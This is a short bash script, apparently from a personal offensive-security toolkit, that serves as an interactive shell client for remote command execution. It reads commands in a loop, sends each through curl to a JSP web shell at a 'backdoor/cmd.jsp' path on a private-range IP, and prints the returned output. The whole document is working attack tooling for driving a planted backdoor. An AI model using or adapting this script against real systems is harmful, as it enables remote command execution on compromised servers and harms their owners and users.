#!/usr/bin/env bash

:<<!
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/10/29

Bash-invoker example script for RCE(Remote command execute) exploit.
!

echo -e "input command.\nExample:\n>whoami\n"
echo -n ">"

while read cmd
do
    printf "\033[32m${cmd}\033[0m\n";

    # FIXME: change to correct command
    # urlencode get param
    content=$(curl -s --data-urlencode cmd="${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')

    printf "\033[33m%s\033[0m\n" "${content}"

    echo -n ">"
done
